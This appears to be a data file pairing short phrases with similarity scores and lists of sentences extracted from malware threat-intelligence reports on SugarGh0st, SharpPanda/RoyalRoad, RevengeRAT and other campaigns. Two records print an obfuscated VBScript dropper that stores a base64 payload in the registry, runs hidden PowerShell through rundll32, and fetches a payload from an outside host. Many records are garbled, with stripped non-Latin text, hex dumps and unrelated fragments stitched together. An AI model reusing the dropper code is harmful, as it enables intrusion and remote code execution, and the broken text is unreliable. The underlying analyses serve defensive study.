is a batch script|0.7999508319715314|['After that, the dropped JavaScript is executed using the living-off-the-land binary (LoLBin) cscript.', 'Sample of malicious LNK file.', 'JavaScript dropper The JavaScript dropper is a heavily obfuscated script embedded with base64 encoded data of the other components of the attack.', 'The JavaScript decodes and drops the embedded files into the %TEMP% folder, including a batch script, a customized DLL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundll32 executable from the Windows\\\\SysWow64 folder into the %TEMP% folder.', 'Finally, it executes the batch script loader from the %TEMP% location and runs the customized DLL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16The JavaScript dropper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the commands to run the dropped customized DLL loader.', 'When executed, it sideloads the DLL loader with rundll32.exe and executes the function which is DllUnregisterServer, typically used by COM (Component Object Model) DLLs.', 'The batch script loader.']
is a batch script|0.7999508319715314|['After that, the dropped JavaScript is executed using the living-off-the-land binary (LoLBin) cscript.', 'https://blog.talosintelligence.com/new-sugargh0st-rat/ 5/191/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea Sample of malicious LNK file.', 'JavaScript dropper The JavaScript dropper is a heavily obfuscated script embedded with base64 encoded data of the other components of the attack.', 'The JavaScript decodes and drops the embedded files into the %TEMP% folder, including a batch script, a customized DLL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundll32 executable from the Windows\\\\SysWow64 folder into the %TEMP% folder.', 'Finally, it executes the batch script loader from the %TEMP% location and runs the customized DLL loader.', 'The JavaScript deleted itself from the file system afterward.', 'https://blog.talosintelligence.com/new-sugargh0st-rat/ 6/191/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript dropper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the commands to run the dropped customized DLL loader.', 'When executed, it sideloads the DLL loader with rundll32.exe and executes the function which is DllUnregisterServer, typically used by COM (Component Object Model) DLLs.', 'The batch script loader.']
leverages a specific set of vulnerabilities, including CVE-2018-0802, CVE-2018-0798, and CVE-2017-11882, within the Equation Editor of Microsoft Office|0.7733063124077195|['Re:Dive nao-sec.org/2021/01/royal-road-redive.html nao_sec HomeArchiveAbout 2021-01-04 1/16Abstract We introduced the Royal Road RTF Weaponizer in our previous blog [1] (and the presented at Japan Security Analyst Conference 2020 and CPX 360 CPRCon 2020).', 'Royal Road is a tool shared by many targeted attack groups believed to belong to China.', 'Its been a year since our previous blog, and Royal Road is still in use.', 'Here, we will introduce the Royal Road-related attacks observed during 2020.', 'Previous Blog Lets briefly review the previous blog.', 'Royal Road is a tool that generates RTF files that exploit the Microsoft Office Equation Editor vulnerabilities (CVE-2017-11882, CVE-2018-0798, CVE- 2018-0802).', 'The details of the tool are unknown, but the RTF file generated by it has various characteristics.', 'The definition of RTF file generated by Royal Road may vary from researcher to researcher.', 'Therefore, we define a file that meets the following conditions as an RTF file generated by Royal Road.', '1.', 'Exploiting a vulnerability in Microsoft Office Equation Editor 2.']
leverages a specific set of vulnerabilities, including CVE-2018-0802, CVE-2018-0798, and CVE-2017-11882, within the Equation Editor of Microsoft Office|0.9517630407477431|['The attached document in the spam email is shown below.', '3/10Figure 3 Opened document attachment from spam email Upon opening the document, it initiates the download of a new payload from the attackers remote server (hxxp[:]//13[.]236[.]189[.]80:8000/res/translate[.', ']res), which is RTF file serving as the next-level payload.', '4/10Figure 4 Payload URL present inside the XML file of the malicious document The RTF file is weaponized using a tool called RoyalRoad.', 'This tool enables the TAs to create customized documents containing embedded objects that exploit vulnerabilities in Microsoft Words Equation Editor.', 'RoyalRoad leverages a specific set of vulnerabilities, including CVE-2018-0802, CVE-2018-0798, and CVE-2017- 11882, within the Equation Editor of Microsoft Office.', 'The TAs integrate anti-analysis and anti-debugging techniques into their loaders to avoid being detected while also utilizing the older Equation Editor exploits.', 'The RTF file includes both an encrypted payload and shellcode.', 'Once the RTF file is executed, it proceeds to decrypt and drops an embedded payload, which is a DLL file saved under the name c6gt.b in the %temp% directory.', 'After decryption, the shellcode facilitates the establishment of a persistence mechanism.', 'It achieves this by creating a scheduled task entry, which executes the export function StartA from the DLL c6gt.b using rundll32.exe on a daily basis.']
employs a forged document linked to G7 to target various governments within the G20 forum.|0.7920157293791291|['The G20, or Group of Twenty, is an international forum comprising 19 countries and the European Union (EU).', 'Established in 1999, its primary objective is to foster global economic cooperation and address key challenges impacting the worldwide economy.', 'Member countries of the G20 include Argentina, Australia, Brazil, Canada, China, France, Germany, India, Indonesia, Italy, Japan, Mexico, Russia, Saudi Arabia, South Africa, South Korea, Turkey, the United Kingdom, and the United States.', 'Together, these nations represent a diverse range of economies, constituting a significant share of global GDP and population.', 'The G20 holds annual summits where leaders convene to discuss and coordinate security, economic, and financial policies.', '1/10In its latest campaign, the SharpPanda APT group employs a forged document linked to G7 to target various governments within the G20 forum.', 'The delivery mechanism of the SharpPanda APT attack via a spam email is illustrated in the figure below.', 'Figure 1 Infection chain Technical Details Initial Infection The infection process initiates through a spam email comprising an attached MS Office document named [FINAL] Hiroshima Action Statement for Resilient Global Food Security_trackchanged.docx.', 'These emails, with the subject line [Sending Finalized Text] G7+Partners FASS Meeting, are distributed to multiple employees within government entities across G20 countries, as shown in the figure below.', '2/10Figure 2 Spam email containing malicious doc attachment The emails contain weaponized versions of seemingly genuine official documents, which employ the remote template injection method to retrieve the next stage of the malware from the TAs Command-and-Control (C&C) server.', 'The attached document in the spam email is shown below.']
downloads and executes a malicious backdoor|0.8030079534225683|['Figure 7 Exfiltrated data to C&C server Final Payload Once the victims information is sent to the remote server, the TA checks the information.', 'If they deem the victims machine to be intriguing, the C&C server responds with the next stage executable.', 'During the final phase of the infection chain, the malicious loader in the SharpPanda APT campaign is specifically designed to download a backdoor module.', 'However, during our analysis, no response was received from the remote server.', 'In previous SharpPanda APT campaigns, the loader establishes a connection with a C&C server in the final stage of the attack.', 'Subsequently, it downloads and executes a malicious backdoor.', 'With its extensive capabilities, this backdoor possesses the ability to perform a variety of operations, including: Capture screenshots of victims system Obtain information about processes and services running on the machine Create or terminate processes 8/10Delete/Create/Rename/Read/Write files and retrieve file attributes Retrieve TCP/UDP tables Retrieve information about registry keys Obtain titles of all top-level windows Trigger a shutdown of the targeted computer Gather computer-specific information such as computer name, username, gateway address, network adapter details, Windows version, and user type Conclusion The SharpPanda APT group is comprised of exceptionally sophisticated cyber-TAs who execute targeted and extended attacks against specific targets, including governments, organizations, and industries, with the objectives of spying, disruption, or monetary gain.', 'SharpPanda has been associated with multiple cyber espionage campaigns, employing strategies such as spear-phishing, manipulation through social engineering, and exploiting zero-day vulnerabilities to gain illicit access to networks.', 'Previously, this group has been observed targeting government officials, particularly in Southeast Asian countries.', 'However, as evidenced in this recent campaign, their focus has shifted to high-level government officials from G20 countries in Europe, North America, and South Asia.', 'The APT group consistently adapts its techniques and incorporates new tools into its arsenal as it evolves.']
enables the TAs to create customized documents containing embedded objects that exploit vulnerabilities in Microsoft Word’s Equation Editor|0.9046206579060381|['2/10Figure 2 Spam email containing malicious doc attachment The emails contain weaponized versions of seemingly genuine official documents, which employ the remote template injection method to retrieve the next stage of the malware from the TAs Command-and-Control (C&C) server.', 'The attached document in the spam email is shown below.', '3/10Figure 3 Opened document attachment from spam email Upon opening the document, it initiates the download of a new payload from the attackers remote server (hxxp[:]//13[.]236[.]189[.]80:8000/res/translate[.', ']res), which is RTF file serving as the next-level payload.', '4/10Figure 4 Payload URL present inside the XML file of the malicious document The RTF file is weaponized using a tool called RoyalRoad.', 'This tool enables the TAs to create customized documents containing embedded objects that exploit vulnerabilities in Microsoft Words Equation Editor.', 'RoyalRoad leverages a specific set of vulnerabilities, including CVE-2018-0802, CVE-2018-0798, and CVE-2017- 11882, within the Equation Editor of Microsoft Office.', 'The TAs integrate anti-analysis and anti-debugging techniques into their loaders to avoid being detected while also utilizing the older Equation Editor exploits.', 'The RTF file includes both an encrypted payload and shellcode.', 'Once the RTF file is executed, it proceeds to decrypt and drops an embedded payload, which is a DLL file saved under the name c6gt.b in the %temp% directory.', 'After decryption, the shellcode facilitates the establishment of a persistence mechanism.']
includes both an encrypted payload and shellcode|0.8388923034540258|[']res), which is RTF file serving as the next-level payload.', '4/10Figure 4 Payload URL present inside the XML file of the malicious document The RTF file is weaponized using a tool called RoyalRoad.', 'This tool enables the TAs to create customized documents containing embedded objects that exploit vulnerabilities in Microsoft Words Equation Editor.', 'RoyalRoad leverages a specific set of vulnerabilities, including CVE-2018-0802, CVE-2018-0798, and CVE-2017- 11882, within the Equation Editor of Microsoft Office.', 'The TAs integrate anti-analysis and anti-debugging techniques into their loaders to avoid being detected while also utilizing the older Equation Editor exploits.', 'The RTF file includes both an encrypted payload and shellcode.', 'Once the RTF file is executed, it proceeds to decrypt and drops an embedded payload, which is a DLL file saved under the name c6gt.b in the %temp% directory.', 'After decryption, the shellcode facilitates the establishment of a persistence mechanism.', 'It achieves this by creating a scheduled task entry, which executes the export function StartA from the DLL c6gt.b using rundll32.exe on a daily basis.', 'The figure below illustrates the presence of embedded content within the RTF document.', '5/10Figure 5 Embedded payload in RTF file Once the persistence is established, the RTF file proceeds to execute the downloaded DLL payload by utilizing the rundll32.exe command as follows: rundll32.exe C:\\\\Users<Admin>\\\\AppData\\\\Local\\\\Temp\\\\c6gt.b StartA DLL Downloader (c6gt.b) The DLL files original name is Downloader.dll.']
encrypts the collected information using RC4 encryption with the key “xkYgv127” and encodes it using base64.|0.8536452650156692|['The figure below illustrates the presence of embedded content within the RTF document.', '5/10Figure 5 Embedded payload in RTF file Once the persistence is established, the RTF file proceeds to execute the downloaded DLL payload by utilizing the rundll32.exe command as follows: rundll32.exe C:\\\\Users<Admin>\\\\AppData\\\\Local\\\\Temp\\\\c6gt.b StartA DLL Downloader (c6gt.b) The DLL files original name is Downloader.dll.', 'It contains four export functions, as depicted below.', '6/10Figure 6 Export functions of the DLL loader When the loader is executed through rundll32.exe, it collects various data from the victims computer.', 'This includes the hostname, operating system name, OS version, username, Internet information, as well as the presence of any installed anti-virus software on the machine.', '7/10Subsequently, the loader encrypts the collected information using RC4 encryption with the key xkYgv127 and encodes it using base64.', 'The encrypted data is then exfiltrated using the below C&C URL: hxxps://13[.]236[.]189[.]80:8001/G0AnyWhere_up[.', ']jsp?Data=[redacted] The figure below illustrates the exfiltrated data sent to the C&C server, as well as the decrypted/decoded stolen information obtained from the victims machine.', 'Figure 7 Exfiltrated data to C&C server Final Payload Once the victims information is sent to the remote server, the TA checks the information.', 'If they deem the victims machine to be intriguing, the C&C server responds with the next stage executable.', 'During the final phase of the infection chain, the malicious loader in the SharpPanda APT campaign is specifically designed to download a backdoor module.']
scheduled task entry,|0.8019254299874237|['Copyright Leonardo S.p.a. All rights reserved 22 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE ATT&CK TTPs T1059 Command-Line Command-line interfaces provide a way of interacting with computer Interface systems and is a common feature across many types of operating system platforms.', 'One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc.', 'Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.', 'Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.', 'T1105 Remote File Files may be copied from one system to another to stage adversary Copy tools or other files over the course of an operation.']
using rundll32.exe|0.9031620546865982|"['Visual Basic Script hidden behind the web page Its funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities: 3/11Update Copyright: Microsoft Corp.', 'This script is designed to be used only for scheduled tasks(s).', 'There is no extensive error check, and will not dump the output from the Powershell CmdLet.', 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)} These comments are in fact part of the SyncAppvPublishingServer utility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions: Store a base64 encoded version of the RevengeRAT payload into registry key located at HKCU\\\\AppEvents\\\\Values CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ"" Decode and execute of the stored payload Set A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get- ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHide Create and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs, capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']br Set XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t("""" [af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHide 4/11Finally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
using rundll32.exe|0.9031620546865982|"[']com shormanz[.', ']com verofes[.', ']com : 2/3rundll32 C:\\\\Windows\\\\Tasks\\\\pe.dll,DllRegisterServer C:\\\\Windows\\\\Tasks\\\\pe.dll : 1.', '(EXCEL.EXE, WINWORD.EXE )  (, rundll32.exe, wscript.exe ).', ""2.    '"", 'rundll32.exe.', ': 3/3']"
using rundll32.exe|0.9031620546865982|"['Home page of the Blogger drop urlBut a deeper inspection of its source code reveals an interesting snippet inserted into an invisible blog post: this ghost article contains VBScript code.Figure 4.', ""Visual Basic Script hidden behind the web pageIts funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities:'Update---------------------------------------------------------------------------------------------' Copyright: Microsoft Corp.'' This script is designed to be used only for scheduled tasks(s).'"", ""There is no extensive error check, and will not dump the output from the Powershell CmdLet.''"", 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)}These comments are in fact part of the SyncAppvPublishingServerutility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions:Store a base64 encoded version of the RevengeRAT payload into registry key located at""HKCU\\\\AppEvents\\\\Values""CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ""Decode and execute of the stored payloadSet A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get-ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHideCreate and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs,capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']brSet XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t(""""[af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHideFinally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
using rundll32.exe|0.9031620546865982|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
Internet information,|0.7743537216436273|['The integrated parts of EIW degrade enemy situational awareness and understanding, and cause physical and psychological limitations of enemy actions in combat.', 'See chapter 9 for additional information on EIW.', '4-34 ATP 7-100.2 24 July 2020Battle Drills 4-108.', 'Perception management and media manipulation in EIW can be KPA advantages with significant planning and effective deception and misinformation actions.', 'The influence of EIW on the enemy and a relevant population manipulates societal or cultural norms that can shape or misguide behaviors.', 'Densely populated urban areas present EIW opportunities less likely in rural environments due to easier multiple media reporting and access to social media and the Internet.', '4-109.', 'Urban environment actions incorporate offensive, defensive, and counterstability mission tasks.', 'Urban considerations include complex manmade physical terrain and natural terrain, such as waterways and severe topography slopes in elevation or depression that can transit an urban area.', 'Other urban aspects are demographics of the population, manmade support systems existing within the urban area in building complexes and surface thoroughfares, and trafficability in subsurface or deep subterranean systems.', '4-110.']
Internet information,|0.7743537216436273|['The Security researchers tweeted that A platform used to control delete fi les, or disable services.', 'F5 ACSC performed CHIPs scanning disclosed, researchers published vulnerability was so easy to exploit real world devices are being erased.', 'traffi c that passes through an encouraged users running at-risk to determine how many Australian exploits, with malicious actors that some security researchers The ACSC received its fi rst reported enterprise network, developed versions to upgrade as soon devices were vulnerable, and notifi ed soon using them in attacks across speculated that it did not end up in Australian incidents relating to by US company F5.', 'as possible.', 'government operators.', 'the internet.', 'the products by accident.', 'exploitation of F5.', 'F5 BIG-IP Confl uence What is Confl uence?', '25 August 2021 31 August 2021 1 September 2021 A web-based database tool for Atlassian publicly announced a A Proof of Concept for the exploit was A CHIPs scan detected malicious team collaboration, developed vulnerability (CVE-202126084) published online; fi rst public reports actors scanning for, and attempting by Australian technology in certain versions of Atlassian of exploitation occurred the to exploit, this vulnerability on company Atlassian.', 'Confl uence and released software same day.']
Internet information,|0.8056944655826179|['If $169 but there are often discounts communications.', 'I was not lazy, I would create a playlist online.', 'This was a step up from the in Kodi from my digital MP3 collection.', 'introductory $100 Crosley T400.', 'Both Internet Restrictions: This option However, I would usually throw on have a similar needle, but the C100 will not be popular.', 'Every night around SiriusXM, a live radio feed, or another has an adjustable tone arm (to help 9pm, I shut off the internet.', 'All of it.', 'streaming service.', 'These endless audio preserve my new upcoming record The incoming modem, my firewall, transmissions encouraged me to sit collection) and better pitch control.', 'and the Wi-Fi.', 'This eliminates any non-stop in front of my computer That was important to me and was possible connection since all cellular is while listening to digitally-compressed missing from other affordable models.']
Capture screenshots of victims’ system|0.83138407100023|['Stop communications: Terminate communication session with the C2 until the next run.', 'Weve observed unimplemented Figure 14: Malicious VBScript used to persist MargulasRAT across reboots.', 'command codes in the MargualsRAT indicating that this RAT is actively in development by the attackers.', 'ALLAKORE Allakore is a publicly available Delphi- based RAT that has consistently been used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Allakore include: Keylogging.', 'Capture screenshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change wallpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).']
"exe└──cmd.exe: C:\Windows\system32\cmd.exe /c """"rdp.bat"""|0.7995229797281664|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
"exe└──cmd.exe: C:\Windows\system32\cmd.exe /c """"rdp.bat"""|0.7995229797281664|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
"exe└──cmd.exe: C:\Windows\system32\cmd.exe /c """"rdp.bat"""|0.7995229797281664|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
or Windows Scripting|0.7847446950619035|['.w.i.', 'exemail.net pic.glkjcorp.com yahoomail.adobeus.com 00000220 6C 00 6C 00 20 00 6E 00 6F 00 74 00 20 00 66 00 l.l.', '.n.o.t.', '.f.', 'flash.adobeus.com pic.hkabinc.com ygfk.sfcorporation.com 00000230 75 00 6E 00 63 00 74 00 69 00 6F 00 6E 00 20 00 u.n.c.t.i.o.n.', '.', 'fngs.adobeus.com pics.adobeus.com yhkj.sfcorporation.com 00000240 70 00 72 00 6F 00 70 00 65 00 72 00 6C 00 79 00 p.r.o.p.e.r.l.y.', 'fsw.adobeus.com pics.amazonwikis.com yjbf.amazonwikis.com gde.moviestops.com projectscorp.net yjxy.sfcorporation.com 00000250 2E 00 20 00 00 00 00 00 00 00 00 00 00 00 00 00 .. ............. ghlc.adobeus.com qsgs.sfcorporation.com yqby.wordoscorp.com ---Truncated--- glkjcorp.com rbjg.moviestops.com zdzl.sfcorporation.com 00000380 00 00 00 00 43 00 72 00 79 00 70 00 74 00 50 00 ....C.r.y.p.t.P.', 'gmnspace.com rbjg.moviestops.com ziper.imbbs.in 00000390 6F 00 6C 00 2E 00 64 00 6C 00 6C 00 00 00 00 00 o.l...d.l.l..... guhk.moviestops.com rbny.sfcorporation.com zpgx.tomshardpc.com ---Truncated--- health.dns1.us rbxr.tomshardpc.com All Known IP hglg.wordoscorp.com rjby.tomshardpc.com 00000580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................', 'Addresses: hjxt.sfcorporation.com rjjh.wordoscorp.com 00000590 62 63 73 72 2E 77 6F 72 64 6F 73 63 6F 72 70 2E bcsr.wordoscorp.', '108.171.240.154 hkabinc.com rmax.amazonwikis.com 000005A0 63 6F 6D 00 00 00 00 00 00 00 00 00 00 00 00 00 com............. hkmj.amazonwikis.com ruag.amazonwikis.com 111.67.199.213 111.67.199.222 ---Truncated--- home.sfcorporation.com sane.adobeus.com 112.175.69.60 00000680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 73 ...............s hsjs.wordoscorp.com sdj2b.3322.org 112.175.69.89 hsy.moviestops.com sfcorporation.com 00000690 50 00 00 00 6A 6E 68 73 2E 74 6F 6D 73 68 61 72 P...jnhs.tomshar 112.218.71.202 iccbhhjdgb.adobeus.com sgad.sfcorporation.com 000006A0 64 70 63 2E 63 6F 6D 00 00 00 00 00 00 00 00 00 dpc.com......... 113.10.139.218 image.amazonwikis.com showjiao.imzone.in ---Truncated--- image.hkabinc.com showshow.7766.org 113.10.168.22 113.11.202.233 00000780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ imnothk.8800.org smgs.amazonwikis.com 114.108.150.38 00000790 00 00 00 FF BB 01 00 00 4B 54 56 59 00 EE 12 00 ......KTVY... jggs.sfcorporation.com smtp.adobekr.com 116.255.131.152 jiaoshow.9966.org sport.sfcorporation.com 000007A0 5F F1 C1 54 C8 AF 00 00 D7 07 00 00 01 00 00 00 _T......... 118.99.37.87 jnhs.tomshardpc.com ssl.elecarrow.com 000007B0 00 00 00 00 20 8E 01 00 5B 00 52 00 45 00 44 00 .... ..[.R.E.D.']
the HTTPS beacon|0.8170346367811436|[]
spear phishing attachments.|0.7542564405624104|"['2.', '(Attack Scenario) 2.1.', '(Attack Flowchart)   , CHM  JSE  C2    .', '[ 2-1]  2JSE Genians Security Center 3Threat Intelligence Report 2.2.', '- (Initial Access-Phishing) 2023 8        .', '.', ',    .', '(C2)    .', ',   (Top-level domain, TLD) "".cam""  .', 'donotreply@sgibn.cam https://honess[.', ']fun/0e650c610b7e1075477745755b  /download [ 2-1]    Genians Security Center 4Threat Intelligence Report [ 2-2]   Genians Security Center 5Threat Intelligence Report 2.3.']"
spear phishing attachments.|0.7542564405624104|"['(Reference).................................................................48 9.1.', '........................................................................................48 9.2.', ""........................................................................................48 Genians Security Center 1Threat Intelligence Report  (Executive Summary)        Konni APT  '(LNK)'   VBS, BAT        EDR     C2 ,   1."", '(Overview) 1.1.', ""(Background)  7 31,  ( GSC)  '   ' (Konni) APT    .1      ,     Genian EDR2   ."", '.', '1.2.', '(Threat Hunting)       6 27 .', '7~8     .', ', 8     .', '.']"
spear phishing attachments.|0.7637847955696017|['In October 2015 the Callisto Group targeted a handful of individuals with phishing emails that attempted to obtain the targets webmail credentials.', 'In early 2016 the Callisto Group began sending highly targeted spear phishing emails with malicious attachments that contained, as their final payload, the Scout malware tool from the HackingTeam RCS Galileo platform.', 'These spear phishing emails were crafted to appear highly convincing, including being sent from legitimate email accounts suspected to have been previously compromised by the Callisto Group via credential phishing.', 'The Callisto Group has been active at least since late 2015 and continues to be so, including continuing to set up new phishing infrastructure every week.', 'F-SECURE LABS CONTENTS THREAT INTELLIGENCE Summary .............................................2 Malware analysis Whitepaper Intelligence ...........................................3 Introduction .', '.', '.', '.', '.', '.', '.']
